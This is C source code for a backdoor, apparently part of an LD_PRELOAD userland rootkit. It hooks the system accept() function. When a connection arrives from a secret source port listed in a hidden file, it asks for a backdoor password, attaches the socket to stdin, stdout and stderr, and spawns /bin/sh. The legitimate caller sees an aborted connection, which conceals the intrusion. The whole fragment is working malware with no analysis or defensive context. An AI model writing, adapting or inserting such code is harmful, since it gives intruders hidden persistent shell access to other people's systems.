void abackconnect(int sockfd){
    char tmp[128];
    int got_pw;

    hook(CREAD, CCHDIR);

    send(sockfd, ": ", 2, 0);

    memset(tmp, 0, sizeof(tmp));
    call(CREAD, sockfd, tmp, sizeof(tmp)-1);
    tmp[strlen(tmp)-1]='\0';
    got_pw = !strcmp(crypt(tmp, BACKDOOR_PASS), BACKDOOR_PASS);
    if(!got_pw){
        shutdown(sockfd, SHUT_RDWR);
        close(sockfd);
        exit(0);
    }

    for(int i=0; i<3; i++)
        dup2(sockfd, i);

    call(CCHDIR, HOMEDIR);
    system("./bdvprep;id;w");
    execl("/bin/sh", "sh", NULL);
    shutdown(sockfd, SHUT_RDWR);
    close(sockfd);
}

int getacceptport(void){
    int port=0;
    FILE *fp;
    char buf[13];
    hook(CFOPEN);
    fp = call(CFOPEN, HIDEPORTS, "r");
    if(fp == NULL) return 0;
    if(fgets(buf, sizeof(buf), fp) == NULL){
        fclose(fp);
        return 0;
    }
    port = atoi(buf);
    fclose(fp);
    return port;
}

int dropshell(int sockfd, struct sockaddr_in *sa_i, gid_t magicgid){
    preparehideports(magicgid);
    int accport = getacceptport();
    if(accport == 0) return sockfd;
    int sport = htons(sa_i->sin_port);
    if(sport == accport){
        pid_t pid = fork();
        if(pid == 0){
            hook(CSETGID);
            call(CSETGID, magicgid);
            fsync(sockfd);
            abackconnect(sockfd);
            exit(0);
        }else{
            errno = ECONNABORTED;
            return -1;
        }
    }

    return sockfd;
}

int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen){
    hook(CACCEPT);
    int s = (long)call(CACCEPT, sockfd, addr, addrlen);
    struct sockaddr_in *sa_i = (struct sockaddr_in *)addr;
    gid_t magicgid = readgid();
    if(getgid() == magicgid || !sa_i) return s;
    return dropshell(s, sa_i, magicgid);
}